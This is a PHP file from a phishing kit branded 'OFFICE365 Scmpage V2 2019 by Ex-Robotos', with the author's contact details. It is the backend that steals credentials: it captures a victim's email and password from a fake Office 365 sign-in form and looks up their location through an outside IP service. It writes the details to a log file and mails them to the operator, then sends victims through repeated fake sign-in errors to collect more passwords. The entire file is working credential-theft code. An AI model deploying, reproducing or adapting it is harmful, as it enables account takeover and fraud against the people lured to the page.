<?php
/* 
OFFICE365 Scmpage V2 2019 by Ex-Robotos
Email: ex.robotos@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: 745771262
*/
error_reporting(0);include('blocker.php');include('config.php');$password=$_POST['pass'];$data=$_GET['data'];if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$remoteIP=$_SERVER["HTTP_CF_CONNECTING_IP"];}else{$remoteIP=$_SERVER['REMOTE_ADDR'];}$headers="From: ".$fromname." <".$fromemail.">"."\r\n"."MIME-Version: 1.0";if(base64_encode(base64_decode($data))===$data){$email=base64_decode($data);$email=filter_var($email,FILTER_SANITIZE_EMAIL);if(!filter_var($email,FILTER_VALIDATE_EMAIL)||!isset($_POST['pass'])||$_POST['pass']==""){die(header("Location: ".$FailRedirect));}}else{$email=$data;$email=filter_var($email,FILTER_SANITIZE_EMAIL);if(!filter_var($email,FILTER_VALIDATE_EMAIL)||!isset($_POST['pass'])||$_POST['pass']==""){die(header("Location: ".$FailRedirect));}}$subject="$email | $remoteIP $subjectTitle";$ExRobotos=curl_init();curl_setopt($ExRobotos,CURLOPT_URL,"http://ip-api.com/json/".$remoteIP);curl_setopt($ExRobotos,CURLOPT_HEADER,0);curl_setopt($ExRobotos,CURLOPT_RETURNTRANSFER,TRUE);$curlExec=curl_exec($ExRobotos);curl_close($ExRobotos);$IP_LOOKUP=json_decode($curlExec,true);$browser=$_SERVER['HTTP_USER_AGENT'];$date=date("D M d, Y g:i a");if($IP_LOOKUP&&$IP_LOOKUP['query']!=null){$Ex_country=$IP_LOOKUP['country'];$Ex_countrycode=$IP_LOOKUP['countryCode'];$Ex_state=$IP_LOOKUP['regionName'];$Ex_city=$IP_LOOKUP['city'];$Ex_postal=$IP_LOOKUP['zip'];$message="
OFFICE365 Scmpage V2 2019 by Ex-Robotos
Information: New Logs
Email : $email - Password : $password
IP Address: $remoteIP Country: $Ex_country Country Code: $Ex_countrycode
Region: $Ex_state City: $Ex_city Postal Code: $Ex_postal
Date: $date Browser: $browser
";$logs="
+ ------------OFFICE365 Scmpage V2 2019 by Ex-Robotos----------+
|OFFICE365 V2 by Ex-Robotos
|Information: New Logs
|Email : $email - Password : $password
|IP Address: $remoteIP
|Country: $Ex_country Country Code: $Ex_countrycode
|Region: $Ex_state City: $Ex_city Postal Code: $Ex_postal
|Date: $date Browser: $browser
+ --------------------------------------------------------------+
";if(isset($logsfileName)&&$logsfileName!==''&&$logsfileName!=='false'&&$logsfileName!=='FALSE'&&$logsfileName!==false){$file=fopen("./".$logsfileName,"a");fwrite($file,$logs);fclose($file);}mail($toEmail,$subject,$message,$headers);}else{$message="
OFFICE365 Scmpage V2 2019 by Ex-Robotos
Information: New Logs
Email : $email - Password : $password
Date: $date Browser: $browser
Failed fetching data from API (may be API is dead or CURL is disabled)
";$logs="
+ ------------OFFICE365 Scmpage V2 2019 by Ex-Robotos----------+
|OFFICE365 V2 by Ex-Robotos
|Information: New Logs
|Email : $email - Password : $password
|Date: $date Browser: $browser
|Failed fetching data from API (may be API is dead or CURL is disabled)
+ --------------------------------------------------------------+
";if($fixIndex==true || $fixIndex=="true" || $fixIndex=="TRUE" || $fixIndex=="True"){$fixIndex="index.php";}else{$fixIndex="";};if(isset($logsfileName)&&$logsfileName!==''&&$logsfileName!=='false'&&$logsfileName!=='FALSE'&&$logsfileName!==false){$file=fopen($logsfileName,"a");fwrite($file,$logs);fclose($file);}mail($toEmail,$subject,$message,$headers);}function RndString($length=50){return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"),0,$length);}$randpart=RndString(50).''.RndString(50).''.RndString(50);if(isset($_GET['error'])){if($passloopNumber==2){die( 
header('Location: ./success.php'));}echo"<script type=\"text/javascript\">window.location.href = \"./$fixIndex?$randpart&status=error2&string=signin&data=$data\"</script>\n";}else if(isset($_GET['error2'])){if($passloopNumber==3){die( 
header('Location: ./success.php'));}echo"<script type=\"text/javascript\">window.location.href = \"./$fixIndex?$randpart&status=error3&string=signin&data=$data\"</script>\n";}else if(isset($_GET['error3'])){die( 
header('Location: ./success.php'));}else{if($passloopNumber==1){die( 
header('Location: ./success.php'));}echo"<script type=\"text/javascript\">window.location.href = \"./$fixIndex?$randpart&status=error&string=signin&data=$data\"</script>\n";} ?>